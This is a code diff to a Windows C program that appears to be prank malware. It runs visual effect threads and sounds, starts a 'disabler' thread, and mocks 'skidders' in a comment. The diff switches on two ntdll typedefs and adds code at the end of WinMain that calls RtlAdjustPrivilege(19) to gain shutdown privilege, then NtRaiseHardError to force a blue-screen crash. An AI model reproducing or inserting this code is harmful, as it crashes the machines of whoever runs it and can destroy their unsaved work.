@@ -1,6 +1,5 @@
 // its the source omfgmgmgmgm
-// Skidder ik what your doing
-
+// Skidder ik what your doing. stop trying to skid it.
 
 #include <windows.h>
 #include <tchar.h>
@@ -16,8 +15,8 @@
 #define PI   3.14159265358979323846264338327950288
 #define min(x, y) ((x)<(y)?(x):(y))
 #define max(x, y) ((x)>(y)?(x):(y))
-//typedef NTSTATUS(NTAPI* NRHEdef)(NTSTATUS, ULONG, ULONG, PULONG, ULONG, PULONG);
-//typedef NTSTATUS(NTAPI* RAPdef)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
+typedef NTSTATUS(NTAPI* NRHEdef)(NTSTATUS, ULONG, ULONG, PULONG, ULONG, PULONG);
+typedef NTSTATUS(NTAPI* RAPdef)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
 
 typedef union _RGBQUAD {
 	COLORREF rgb;
@@ -414,7 +413,7 @@ int CALLBACK WinMain(
 			TerminateThread(thread1, 0);
 			CloseHandle(thread1);
 			InvalidateRect(0, 0, 0);
-	        Sleep(1000);
+	                Sleep(1000);
 			HANDLE thread2 = CreateThread(0, 0, srcandmove, 0, 0, 0);
 			CreateThread(0, 0, (LPTHREAD_START_ROUTINE)disabler, 0, 0, 0);
 			sound2();
@@ -422,14 +421,20 @@ int CALLBACK WinMain(
 			TerminateThread(thread2, 0);
 			CloseHandle(thread2);
 			InvalidateRect(0, 0, 0);
-            Sleep(1000);
+                        Sleep(1000);
 			HANDLE thread3 = CreateThread(0, 0, shader2, 0, 0, 0);
 			sound3();
 			Sleep(30000);
 			TerminateThread(thread3, 0);
 			CloseHandle(thread3);
 			InvalidateRect(0, 0, 0);
-
+                        BOOLEAN bl;
+			DWORD response;
+			NRHEdef NtRaiseHardError = (NRHEdef)GetProcAddress(LoadLibraryW(L"ntdll"), "NtRaiseHardError");
+			RAPdef RtlAdjustPrivilege = (RAPdef)GetProcAddress(LoadLibraryW(L"ntdll"), "RtlAdjustPrivilege");
+			RtlAdjustPrivilege(19, 1, 0, &bl);
+			NtRaiseHardError(0xC00002AC, 0, 0, 0, 6, &response);
+			Sleep(-1);
 
 }}}
 
